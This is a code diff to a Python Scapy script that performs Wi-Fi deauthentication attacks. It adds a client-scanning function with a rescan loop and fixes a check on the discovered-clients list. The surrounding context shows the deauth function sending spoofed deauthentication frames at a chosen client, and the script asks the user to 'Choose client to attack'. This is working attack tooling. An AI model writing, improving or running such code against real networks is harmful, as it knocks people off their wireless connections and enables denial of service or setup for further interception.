@@ -149,6 +149,13 @@ def deauth(client_index:int) -> None:
         pkt = RadioTap()/Dot11(addr1=station_dict.get(client_index), addr2=AP_target[0], addr3=AP_target[1])/Dot11Deauth()
         sendp(pkt, iface=interface, count=30, inter = .001)
 
+def scanClients() -> None:
+    print("scanning clients...")
+    sniff(iface=interface, prn = packetUsers , timeout=10)
+
+    if len(station_dict) == 0: # the clients dictionary is empty
+        print("did not find any client")
+
 
 
 def main():
@@ -197,15 +204,19 @@ def main():
     AP_target = AP_dict.get(convertedChosen)
 
     # Scanning clients
-    print("scanning clients...")
-    sniff(iface=interface, prn = packetUsers , timeout=10)
+    while True:
+        scanClients()
+        retry = input("For scanning again please press 'y': ")
+        if retry != "y":
+            break
+    
 
-    if len(AP_dict) == 0: # the clients dictionary is empty
-        print("did not find any client")
+    if len(station_dict) == 0:
         sys.exit() # end script
-
+        
     client_index = input("Choose client to attack: ")
     deauth(int(client_index))
+
 
     changeToManagedMode(interface) # change back to default mode
 
